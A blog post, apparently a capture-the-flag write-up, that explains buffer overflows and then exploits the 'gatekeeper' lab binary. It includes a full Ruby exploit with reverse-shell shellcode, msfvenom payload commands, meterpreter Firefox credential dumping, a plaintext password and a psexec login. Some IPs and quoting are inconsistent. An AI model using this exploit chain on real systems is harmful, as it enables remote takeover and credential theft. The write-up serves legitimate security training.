---
title: "gatekeeper (buffer overflows)"
date: 2022-10-23T06:59:16-04:00
draft: false
---

lately, i've been getting more and more into reverse engineering executable programs and using them to gain control of a target machine. it brings to mind what i learned in "microcontrollers and microprocessors", a really interesting but tough course i took in my 3rd year of electrical engineering. the course dealt with low-level computing, mainly assembly language (aka ASM), and how it's used to communicate directly with computer architecture and control the usage of memory, on a hardware level. understanding memory usages and allocations on that level paved the way for utilizing buffer overflows, a very popular attack that is a result of reverse engineering.

what exactly is a buffer overflow? well, what is a buffer? buffers are memory storage regions that temporarily hold data while it is transferred from one location to another. a buffer overflow happens when the volume of the data exceeds the storage capacity of the buffer. what happens then is the program, trying to write the data to the desired buffer, overwrites adjacent memory locations (blocks).

take a buffer for a password that allows a user to log-in to an application. let's say the buffer is designed for an input of 8 bytes. if an input of 10 bytes is received, the program may write the excess data past the buffer boundary.

![BOF](/buffer-overflow.png)


## how can buffer overflows be used as attacks?

if buffer overflows can force some programs to write to adjacent memory blocks, it follows that an attacker can provide a large input that would force the program to write "bad" code to those blocks. a buffer overflow would change the execution path of the program, and the attacker can force the program and the target machine to execute a desired payload. 

to do this, attackers would need to know the memory layout of a program and details of the buffer, so that they could effectively abuse the storage capacity of the buffer and overwrite areas that also hold executable code. an example of this is overwriting a pointer (an object that points to another area in memory) and point it to a payload. 

there are 2 types of buffer overflow attacks. the first, and most common, is **stack-based buffer overflow**. these leverage stack memory that only exists during the runtime of a function or program.

the second, less common as it's more difficult to carry out, is a **heap-based buffer overflow**. these involve flooding the memory space allocated for a program beyond memory used for current runtime operations.


## how can developers prevent buffer overflows?

on a code level, devs can prevent buffer overflows by implementing security measures directly inside the code or by using languages that offer built-in protection (like perl, java, javascript, c#).

on an OS level, runtime protection measures can help thwart buffer overflows. 
- **address space randomization (ASLR)**: since buffer overflows require locations of executable code, randomizing address spaces would make this near impossible to carry out.
- **data execution prevention**: this flags certain areas of memory as executable or non-executable, and would thus stop an attack from running code in a non-executable region.
- **structured exception handler overwrite protection (SEHOP)**: structured exception handling (SEH) is a built-in system that manages software and hardware exceptions. **SEHOP** stops malicious code from attacking structured exception handling and thus prevents an attacker from using the SEH overwrite technique. SEH overwrites are achieved using a stack-based buffer overflow to overwrite an exception registration record, stored on a thread's stack.


## gatekeeper

i found this really cool challenge made by an acquaintance, which utilizes a stack-based buffer overflow as a central technique to collect the flags on a target machine. there is no further information provided, which made this challenge one of the most intense and interesting ones i've cracked so far.

upon getting my tun0 address (10.18.12.60) and the target's address (10.10.10.172), i performed an nmap scan.

```
nmap 10.10.10.172

Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-20 15:47 EDT
Nmap scan report for 10.10.90.136
Host is up (0.14s latency).
Not shown: 989 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
31337/tcp open  Elite
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49161/tcp open  unknown
49165/tcp open  unknown
```

drilling down on the open ports with a more specific nmap scan:

```
nmap -p135,139,445,3389,31337 -A 10.10.10.172
```

right away, i can identify an SMB service running on port 445. the next step should be second nature at this point: enumerate the SMB shares. 

```
smbclient -L 10.10.10.172
```

although this command can yield some decent information, i've recently come to prefer using nmap to execute an SMB enumeration script:

```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.10.172

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.10.172\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.10.172\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.10.172\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: READ
|     Current user access: READ/WRITE
|   \\10.10.10.172\Users: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|_    Current user access: READ
```

![SMB](/gatekeeper_smb.png)

the "users" share looks interesting, so i logged into it:

```
smbclient \\\\10.10.10.172\\Users
```

upon executing ```dir```, i see there's a file called "gatekeeper.exe". to download it to my local machine, i simply execute ```smbget smb://10.10.10.172/Users/Share/gatekeeper.exe```

at this point, i fire up a windows VM i'd created for the purposes of reverse engineering and creating proof-of-concepts for buffer overflow attacks. i then transfer "gatekeeper.exe" to my windows VM using the python simplehttpserver. once it's downloaded to my windows machine, i open and run it in immunity debugger, a powerful application used to analyze malware and reverse engineer binary files.

before i do anything else with immunity debugger, i need to find the port that gatekeeper is running on. inside the windows command prompt, i first find the process ID (PID) of the program and then use that to find the port.

```
tasklist | gatekeeper.exe
```
![PID](/gatekeeper_PID.png)

```
netstat -aon | findstr 5148
```
![netstat](/gatekeeper_netstat.png)

the program is running on port 31337.


now that we know which port the program is running on, and while it's running inside immunity debugger (which will delineate all the memory operations of the program), i return to my kali machine to create a simple exploit that will supply gatekeeper with my inputs. if the program successfully receives my input, i'll then try to crash it with a large string and if that also works, i'll work on a proper payload that will not only break the program but force it to execute my exploit in adjacent memory.

i prefer writing overflow exploits in ruby (it's a fun new language that i've been learning), so for the simple exploit i'll use a runtime dev console called ```pry```. this can be run directly inside the terminal.

```ruby
pry --simple-prompt
>> require "socket"
>> s=TCPSocket.new("192.168.100.4",31337)
>> s.puts "hello"
```

this little piece of code opens a socket to the program running in windows (addressed at 192.168.100.4) on port 31337. it then "puts" a string (hello) as the input. 

![hello](/gatekeeper_hello.png)

the program received our 6 bytes of input. now i'm going to try and crash it! instead of "hello", i'll send a string of As. 200 of them, to be exact.

```ruby
pry --simple-prompt
>> require "socket"
>> s=TCPSocket.new("192.168.100.4",31337)
>> s.puts "A"*200
```

![A](/gatekeeper_A200.png)

the program crashed, which means buffer overflow is possible! 

to do this, i need to calculate something called the "EIP offset". EIP stands for extended instruction pointer, and it tells the computer where to go to execute the next command. it basically controls the flow of a program. the EIP offset is then the exact number of bytes in the payload after which the EIP gets overwritten. to find the EIP offset, i'll first create a string with which to crash the program, and then observe the EIP in immunity debugger.

```
msf-pattern_create -l 200

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```

i'll paste this string (200 characters long) into the pry:

```ruby
pry --simple-prompt
>> require "socket"
>> s=TCPSocket.new("192.168.100.4",31337)
>> s.puts "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
```

![EIP](/gatekeeper_EIP.png)

the EIP is pointed at 39654138. i can use this to find the offset:
```
msf-pattern_offset -l 2500 -q 39654138

exact match at offset 146
```

to verify this offset value, i'll create an input that will enter A for the first 146 bytes, and then B for the next 4. 

```ruby
pry --simple-prompt
>> require "socket"
>> s=TCPSocket.new("192.168.100.4",31337)
>> s.puts "A"*146+"B"*4
```
![B](/gatekeeper_B.png)

the EIP is now overwritten with "42424242", which is "BBBB" in hex.


so, i know the program is exploitable, along with the EIP offset value. i can now write the proof-of-concept of my exploit. what i'm trying to do is not simply crash the program, but inject a payload ("shellcode") that will spawn a reverse shell that i can then use to further exploit the target machine. the skeleton of the script, called **bof.rb**, looks as follows:

```ruby
buff = "\x90"*146 #NOP slide, forces the program to start right after the offset.
buff+= "" #JMP ESP
buff+= "B"*10 #additional nops for argument values
buff+= "" #shellcode

require 'socket'
TCPSocket.open("<targetIP",31337){ |s| s.puts buff}
```

the ESP register is the stack pointer, which will execute the contents of the stack. now that i have control of the EIP register, i need it to somehow point to the ESP. this is where JMP ESP comes in. JMP ESP basically jumps to the desired ESP. 

the shellcode section is where my payload will go. before i create a payload, i need to find the "bad characters". certain byte characters cause issues in exploit development. a couple common bad characters are x00 (null byte: truncates the shellcode when executed) and x0a (carriage return). to find all possible bad characters, i'll just write a list of all hex characters (excluding x00 and x0a).

```ruby
buff+= ""\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f" +
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40" +
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f" +
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f" +
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f" +
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf" +
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf" +
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff""
```

i'll run the exploit using ```ruby bof.rb``` and then in immunity debugger, compare against a byte array to isolate the bad characters. note the ESP when the exploit terminates: 008D19E4.

```
!mona bytearray -b "\x00\x01\x02\x03\x04"
!mona compare -f C:\mona\gatekeeper\bytearray.txt 008D19E4
```
![badchars](/gatekeeper_badchars.png)

i used an expanded array from x00 to x04, and the results show that x0a is the first corrupted byte. that means the only bad characters i have are x00 and x0a.

before i move on, i must verify if ASLR (address space randomization) is turned off. the attack will not work otherwise.

```
!mona modules
```

ASLR is set to "false", so i can proceed with finding the JMP ESP values.

```
!mona jmp -r esp -m gatekeeper.exe
```
![ESP](/gatekeeper_esp.png)

i get back 2 pointers: 0x080414c3 and 0x080416bf. i'll use the former, but for my script i have to convert it to [little endian](https://en.wikipedia.org/wiki/Endianness) format, which stores the least significant byte at the smallest memory address. 

```ruby
buff+= "\xc3\x14\x04\x08"
```

for the actual shellcode, i'll use msfvenom.

```
msfvenom -p windows/shell_reverse_tcp LHOST=<local IP> LPORT=4444 -f rb -b "\x00\x0a"
```
![shellcode](/gatekeeper_shellcode.png)

the code for bof.rb is now complete!

```ruby
buff = "\x90"*146 #NOP slide, forces the program to start right after the offset.
buff+= "\xc3\x14\x04\x08" #JMP ESP
buff+= "B"*10 #additional NOPs for argument values
buff+= ""\xdb\xc8\xb8\xf3\x0f\xd1\xd9\xd9\x74\x24\xf4\x5d\x29\xc9" +
"\xb1\x52\x83\xc5\x04\x31\x45\x13\x03\xb6\x1c\x33\x2c\xc4" +
"\xcb\x31\xcf\x34\x0c\x56\x59\xd1\x3d\x56\x3d\x92\x6e\x66" +
"\x35\xf6\x82\x0d\x1b\xe2\x11\x63\xb4\x05\x91\xce\xe2\x28" +
"\x22\x62\xd6\x2b\xa0\x79\x0b\x8b\x99\xb1\x5e\xca\xde\xac" +
"\x93\x9e\xb7\xbb\x06\x0e\xb3\xf6\x9a\xa5\x8f\x17\x9b\x5a" +
"\x47\x19\x8a\xcd\xd3\x40\x0c\xec\x30\xf9\x05\xf6\x55\xc4" +
"\xdc\x8d\xae\xb2\xde\x47\xff\x3b\x4c\xa6\xcf\xc9\x8c\xef" +
"\xe8\x31\xfb\x19\x0b\xcf\xfc\xde\x71\x0b\x88\xc4\xd2\xd8" +
"\x2a\x20\xe2\x0d\xac\xa3\xe8\xfa\xba\xeb\xec\xfd\x6f\x80" +
"\x09\x75\x8e\x46\x98\xcd\xb5\x42\xc0\x96\xd4\xd3\xac\x79" +
"\xe8\x03\x0f\x25\x4c\x48\xa2\x32\xfd\x13\xab\xf7\xcc\xab" +
"\x2b\x90\x47\xd8\x19\x3f\xfc\x76\x12\xc8\xda\x81\x55\xe3" +
"\x9b\x1d\xa8\x0c\xdc\x34\x6f\x58\x8c\x2e\x46\xe1\x47\xae" +
"\x67\x34\xc7\xfe\xc7\xe7\xa8\xae\xa7\x57\x41\xa4\x27\x87" +
"\x71\xc7\xed\xa0\x18\x32\x66\xc5\xce\x30\x4a\xb1\xec\x48" +
"\xa7\xf2\x78\xae\xad\xe4\x2c\x79\x5a\x9c\x74\xf1\xfb\x61" +
"\xa3\x7c\x3b\xe9\x40\x81\xf2\x1a\x2c\x91\x63\xeb\x7b\xcb" +
"\x22\xf4\x51\x63\xa8\x67\x3e\x73\xa7\x9b\xe9\x24\xe0\x6a" +
"\xe0\xa0\x1c\xd4\x5a\xd6\xdc\x80\xa5\x52\x3b\x71\x2b\x5b" +
"\xce\xcd\x0f\x4b\x16\xcd\x0b\x3f\xc6\x98\xc5\xe9\xa0\x72" +
"\xa4\x43\x7b\x28\x6e\x03\xfa\x02\xb1\x55\x03\x4f\x47\xb9" +
"\xb2\x26\x1e\xc6\x7b\xaf\x96\xbf\x61\x4f\x58\x6a\x22\x7f" +
"\x13\x36\x03\xe8\xfa\xa3\x11\x75\xfd\x1e\x55\x80\x7e\xaa" +
"\x26\x77\x9e\xdf\x23\x33\x18\x0c\x5e\x2c\xcd\x32\xcd\x4d" +
"\xc4"" #shellcode

require 'socket'
TCPSocket.open("10.10.10.172",31337){ |s| s.puts buff}
```

before executing this script, i'll set up a netcat listener that can receive the reverse shell.

```nc -lvnp 4444```

if, for whatever reason, the port is clogged, i can simply hard kill the process running on it:

```
kill -9 $(lsof -t -i:4444)
```

execute the script using ```ruby bof.rb``` and a shell will have spawned in the netcat session. the flag is stored on the desktop.

![natbat](/gatekeeper_natbat.png)

a quick check of the user's privileges shows that i don't have any special access, so here comes the privilege escalation portion of the challenge.

![whoami](/gatekeeper_whoami.png)

i'll create another shellcode, but this time i want to upgrade it to a meterpreter shell.

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local IP> LPORT=5555 -f rb -b "\x00\x0a"
```

in another terminal window, i'll run the metasploit console to run the handler.

![handler](/gatekeeper_handler.png)

running the exploit using ```exploit -j``` and running my overflow script on the side using ```ruby bof.rb```, a reverse shell will be spawned. once the meterpreter shell is spawned, i'll try to enumerate the applications on the target.

```
> run post/windows/gather/enum_applications

Installed Applications
======================

 Name                                                                Version
 ----                                                                -------
 Amazon SSM Agent                                                    2.3.842.0
 Amazon SSM Agent                                                    2.3.842.0
 EC2ConfigService                                                    4.9.4222.0
 EC2ConfigService                                                    4.9.4222.0
 EC2ConfigService                                                    4.9.4222.0
 EC2ConfigService                                                    4.9.4222.0
 Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.20.27508  14.20.27508.1
 Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.20.27508  14.20.27508.1
 Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.20.27508  14.20.27508.1
 Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.20.27508  14.20.27508.1
 Microsoft Visual C++ 2019 X86 Additional Runtime - 14.20.27508      14.20.27508
 Microsoft Visual C++ 2019 X86 Additional Runtime - 14.20.27508      14.20.27508
 Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.20.27508         14.20.27508
 Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.20.27508         14.20.27508
 Mozilla Firefox 75.0 (x86 en-US)                                    75.0
```

i see firefox is downloaded, which means i can dump its credentials and then use [firefox decrypt](https://github.com/unode/firefox_decrypt) to decrypt them, allowing me to impersonate and log in as the target.

```
> run post/multi/gather/firefox_creds

[+] Downloaded cert9.db: /home/kali/.msf4/loot/20211021043407_default_10.10.10.172_ff.ljfn812a.cert_898397.bin
[+] Downloaded cookies.sqlite: /home/kali/.msf4/loot/20211021043411_default_10.10.10.172_ff.ljfn812a.cook_582398.bin
[+] Downloaded key4.db: /home/kali/.msf4/loot/20211021043414_default_10.10.10.172_ff.ljfn812a.key4_936123.bin
[+] Downloaded logins.json: /home/kali/.msf4/loot/20211021043416_default_10.10.10.172_ff.ljfn812a.logi_001670.bin
```

i have to move the files from /.msf4/ to whichever folder i'm working with, before running firefox_dcrypt.
but also, before i run firefox_dcrypt, i must rename each of the "loot" files to the corresponding names:

```
mv 20211021043407_default_10.10.248.88_ff.ljfn812a.cert_898397.bin cert9.db
mv 20211021043411_default_10.10.248.88_ff.ljfn812a.cook_582398.bin cookies.sqlite
mv 20211021043414_default_10.10.248.88_ff.ljfn812a.key4_936123.bin key4.db
mv 20211021043416_default_10.10.248.88_ff.ljfn812a.logi_001670.bin logins.json
```

running the tool, i get:

```
python3 firefox_decrypt.py /home/kali/gatekeeper/firefoxcreds/loot
Username: 'mayor'
Password: '8CL7O1N78MdrCIsV'
```

so i have an elevated account's credentials. i can run psexec.py (which lets me execute programs on remote systems) using these credentials, effectively granting me special access.

```
python3 psexec.py mayor:8CL7O1N78MdrCIsV@10.10.10.172
```

as demonstrated, buffer overflows are incredibly powerful attack vectors that utilize deep understanding of how memory storage and program execution work in tandem. stopping them is not only difficult and potentially expensive, but necessary. 
